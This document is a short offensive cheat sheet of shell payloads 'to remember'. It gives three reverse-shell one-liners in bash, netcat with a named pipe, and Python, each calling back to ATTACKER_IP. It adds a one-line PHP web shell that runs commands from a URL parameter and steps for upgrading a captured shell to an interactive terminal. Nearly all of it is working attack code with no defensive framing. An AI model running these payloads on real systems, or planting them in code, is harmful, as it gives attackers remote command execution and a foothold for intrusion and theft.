## Key Shell Payloads to Remember

### Bash Reverse Shell (most common)
```bash
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```

### Named Pipe Reverse Shell (more reliable)
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP 4444 >/tmp/f
```

### Python Reverse Shell
```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```

### PHP Web Shell (one liner)
```php
<?php system($_GET["cmd"]); ?>
```

### Always Upgrade Your Shell After Getting Access
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

